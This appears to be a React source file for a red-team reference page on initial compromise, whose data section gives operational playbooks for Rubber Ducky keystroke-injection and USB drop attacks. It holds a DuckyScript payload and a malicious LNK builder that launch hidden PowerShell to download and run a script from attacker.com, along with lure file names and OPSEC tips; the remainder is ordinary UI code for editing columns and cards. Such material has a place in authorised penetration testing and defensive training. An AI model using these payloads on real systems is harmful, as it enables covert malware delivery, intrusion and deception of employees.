    tags: ['Rubber Ducky', 'HID', 'DuckyScript', 'Hak5', 'O.MG Cable', 'Bash Bunny', 'BadUSB'],
    accentColor: 'green',
    overview: 'HID (Human Interface Device) attacks emulate a USB keyboard at the firmware level. The OS trusts HID devices implicitly — no driver installation, no UAC prompt, no AV scan. When plugged in, the device types a preloaded script at superhuman speed. Payloads execute as the logged-in user and bypass every software security control.',
    steps: [
      'Identify the target OS and keyboard layout — DuckyScript requires the correct layout to produce correct characters',
      'Add an initial DELAY of 1500ms to allow the OS to recognise the device before input begins',
      'Open the Run dialog (GUI r), add DELAY 600ms, type the PowerShell command via STRING',
      'Keep commands short — use a short download cradle that fetches a longer script',
      'Encode the DuckyScript payload: ducktools encode -i payload.txt -o inject.bin -l us',
      'Copy inject.bin to the Rubber Ducky micro-SD card',
    ],
    commands: [
      {
        title: 'DuckyScript — PowerShell download cradle',
        code: `REM Rubber Ducky / Bash Bunny / O.MG Cable payload
REM Layout: US | Target: Windows 10/11
DELAY 1500
GUI r
DELAY 600
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('https://attacker.com/s.ps1')"
ENTER`
      },
      {
        title: 'DuckyScript compile and deploy',
        code: `# DuckToolkit — Python compiler
pip install ducktoolkit
ducktools encode -i payload.txt -o inject.bin -l us
# Copy inject.bin to Rubber Ducky micro-SD

# Hak5 payloads: https://github.com/hak5/usbrubberducky-payloads`
      }
    ]
  },
  {
    id: 'usb-drop',
    title: 'Malicious USB Drop Attacks',
    subtitle: 'Physical media drops to trick users into running payloads — no HID needed',
    tags: ['USB drop', 'LNK', 'social engineering', 'physical access', 'canary token', 'autorun'],
    accentColor: 'green',
    overview: 'USB drop attacks exploit human curiosity — drives labelled with enticing names are left in car parks, reception areas, or break rooms. When an employee inserts the drive and browses its contents, a malicious LNK file with a convincing icon executes a payload on double-click.',
    steps: [
      'Prepare USB drives: label with enticing text (Salary_Review_2025, HR_Confidential, Executive_Bonuses)',
      'Create a malicious LNK with a document icon pointing to a PowerShell download cradle',
      'Use a canary token URL in the payload for initial callback — confirms the drive was inserted before the full beacon establishes',
      'Use separate beacon listener for USB payloads to track which drop was activated',
      'Scatter drives in the target location: car park, lobby, break room',
    ],
    commands: [
      {
        title: 'USB weaponisation — LNK payload',
        code: `$lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("Q1_Financials.lnk")
$lnk.TargetPath    = "C:\\Windows\\System32\\cmd.exe"
$lnk.Arguments     = '/c powershell -ep bypass -w hidden -c "IEX((New-Object Net.WebClient).DownloadString(''https://attacker.com/s.ps1''))"'
$lnk.IconLocation  = "C:\\Windows\\System32\\imageres.dll,2"
$lnk.WindowStyle   = 7
$lnk.Save()

# OPSEC: unbranded drives, wipe before use, CDN-fronted URL, dedicated listener per campaign`
      }
    ]
  },
];

export default function InitialCompromise() {
  const { columns, setColumns, allCards, addCustomCard, updateCard, deleteCard, reorderCards } = usePageStorage('initialcompromise', initialMapColumns, techniques);
  const [modalStep, setModalStep] = useState(null);
  const [columnName, setColumnName] = useState('');
  const [selectedColor, setSelectedColor] = useState('cyan');
  const [addingTopicCol, setAddingTopicCol] = useState(null);
  const [topicTitle, setTopicTitle] = useState('');
  const [topicTags, setTopicTags] = useState('');
  const [cardModalOpen, setCardModalOpen] = useState(false);
  const [editingCard, setEditingCard] = useState(null);
  const handleCardSubmit = (card) => { if (editingCard) { updateCard(card); setEditingCard(null); } else addCustomCard(card); };

  const colorOptions = [
    { value: 'cyan', name: 'Cyan' }, { value: 'green', name: 'Green' }, { value: 'red', name: 'Red' }, { value: 'purple', name: 'Purple' },
    { value: 'orange', name: 'Orange' }, { value: 'pink', name: 'Pink' }, { value: 'blue', name: 'Blue' }, { value: 'yellow', name: 'Yellow' },
  ];
  const colorPreview = { cyan: 'bg-cyan-500', green: 'bg-emerald-500', red: 'bg-red-500', purple: 'bg-purple-500', orange: 'bg-orange-500', pink: 'bg-pink-500', blue: 'bg-blue-500', yellow: 'bg-yellow-500' };
  const headerColorMap = { cyan: 'text-cyan-400 border-cyan-500/30', green: 'text-emerald-400 border-emerald-500/30', red: 'text-red-400 border-red-500/30', purple: 'text-purple-400 border-purple-500/30', orange: 'text-orange-400 border-orange-500/30', pink: 'text-pink-400 border-pink-500/30', blue: 'text-blue-400 border-blue-500/30', yellow: 'text-yellow-400 border-yellow-500/30' };

  const handleAddColumnStart = () => setModalStep('name');
  const handleNameSubmit = () => { if (columnName.trim()) setModalStep('color'); };
  const handleColorSubmit = () => { setColumns([...columns, { header: columnName.toUpperCase(), color: selectedColor, nodes: [] }]); setModalStep(null); setSelectedColor('cyan'); setColumnName(''); };
  const handleDeleteColumn = (index) => setColumns(columns.filter((_, i) => i !== index));
  const handleAddTopic = (colIndex) => {
    if (topicTitle.trim()) {
      const updated = [...columns];
      updated[colIndex].nodes.push({ title: topicTitle, subtitle: 'Add details here', tags: topicTags.split(',').map(t => t.trim()).filter(t => t) });
      setColumns(updated); setAddingTopicCol(null); setTopicTitle(''); setTopicTags('');
    }
  };
  const handleDeleteTopic = (colIndex, nodeIndex) => { const updated = [...columns]; updated[colIndex].nodes.splice(nodeIndex, 1); setColumns(updated); };
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Initial </span><span className="text-blue-400">Compromise</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Credential Attacks • Phishing &amp; AiTM • Payload Development • Delivery • Physical &amp; USB</p>
      </div>
      
      <div className="overflow-x-auto pb-4">
        <div className="inline-flex gap-4 min-w-max">
          {columns.map((col, i) => {
            const color = col.color || 'cyan';
            const hColors = headerColorMap[color];
            return (
              <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
                <div className={`text-center py-2 border-b-2 mb-2 ${hColors} flex items-center justify-between px-2`}>
                  <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">
                    {col.header}
                  </span>
                  <button
                    onClick={() => handleDeleteColumn(i)}
                    className="text-slate-500 hover:text-slate-300 transition-colors p-0.5"
                    title="Delete column"
                  >
                    <X className="w-3 h-3" />
                  </button>
                </div>
                <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
                  {col.nodes.map((node, j) => (
                    <div key={j} className="flex items-start gap-1 group">
                      <div className="flex-1 min-w-0">
                        <MapNode
                          title={node.title}
                          subtitle={node.tags && node.tags.length > 0 ? node.tags.join(' • ') : node.subtitle}
                          accentColor={color}
                          small
                        />
                      </div>
                      <button
                        onClick={() => handleDeleteTopic(i, j)}
                        className="text-slate-600 hover:text-red-400 transition-colors p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"
                        title="Delete topic"
                      >
                        <X className="w-3 h-3" />
                      </button>
                    </div>
                  ))}
                  
                  {addingTopicCol === i ? (
                    <div className="flex flex-col gap-1">
                      <input
                        type="text"
                        value={topicTitle}
                        onChange={(e) => setTopicTitle(e.target.value)}
                        placeholder="Topic name"
                        className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500"
                        autoFocus
                        onKeyDown={(e) => {
                          if (e.key === 'Escape') {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }
                        }}
                      />
                      <input
                        type="text"
                        value={topicTags}
                        onChange={(e) => setTopicTags(e.target.value)}
                        placeholder="Tags (comma-separated)"
                        className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500"
                        onKeyDown={(e) => {
                          if (e.key === 'Enter') handleAddTopic(i);
                          if (e.key === 'Escape') {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }
                        }}
                      />
                      <div className="flex gap-1">
                        <button
                          onClick={() => handleAddTopic(i)}
                          className="flex-1 px-2 py-1 bg-blue-600 hover:bg-blue-700 text-white text-xs font-mono rounded transition-colors"
                        >
                          Add
                        </button>
                        <button
                          onClick={() => {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }}
                          className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded transition-colors"
                        >
                          Cancel
                        </button>
                      </div>
                    </div>
                  ) : (
                    <button
                      onClick={() => setAddingTopicCol(i)}
                      className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500 transition-colors"
                    >
                      + Add Topic
                    </button>
                  )}
                </div>
              </div>
            );
          })}
          
          {/* Add Column Button */}
          <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]">
            <button
              onClick={handleAddColumnStart}
              className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20 transition-all"
            >
              <Plus className="w-6 h-6 text-slate-500" />
              <span className="text-xs font-mono text-slate-500 text-center">Add Column</span>
            </button>
          </div>
        </div>
      </div>

      {/* Modal for Adding Column */}
      {modalStep && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
            {modalStep === 'name' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3>
                <input
                  type="text"
                  value={columnName}
                  onChange={(e) => setColumnName(e.target.value)}
                  placeholder="e.g., Custom Category"
                  className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-slate-500"
                  autoFocus
                  onKeyDown={(e) => e.key === 'Enter' && handleNameSubmit()}
                />
                <div className="flex gap-2">
                  <button
                    onClick={() => setModalStep(null)}
                    className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleNameSubmit}
                    className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors font-mono text-sm font-semibold"
                  >
                    Next
                  </button>
                </div>
              </div>
            )}

            {modalStep === 'color' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3>
                <div className="flex flex-col gap-2 max-h-64 overflow-y-auto">
                  {colorOptions.map((option) => (
                    <button
                      key={option.value}
                      onClick={() => setSelectedColor(option.value)}
                      className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold transition-all flex items-center gap-2 ${
                        selectedColor === option.value
                          ? `${colorPreview[option.value]} text-slate-900`
                          : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                      }`}
                    >
                      <div className={`w-3 h-3 rounded-full ${colorPreview[option.value]}`} />
                      {option.name}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button
                    onClick={() => setModalStep('name')}
                    className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm"
                  >
                    Back
                  </button>
                  <button
                    onClick={handleColorSubmit}
                    className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors font-mono text-sm font-semibold"
                  >
                    Create
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div className="flex items-center justify-between pt-4">
        <button onClick={() => setCardModalOpen(true)} className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs font-mono rounded transition-colors flex items-center gap-1">
          <Plus className="w-3 h-3" /> Add Technique
        </button>
      </div>
      <AddCardModal isOpen={cardModalOpen || !!editingCard} onClose={() => { setCardModalOpen(false); setEditingCard(null); }} onSubmit={handleCardSubmit} editCard={editingCard} />
      <div className="border-t border-slate-800/50 pt-10">
        <DraggableCardList cards={allCards} onDelete={deleteCard} onReorder={reorderCards} onEdit={(card) => setEditingCard(card)} />
      </div>
    </div>
  );
}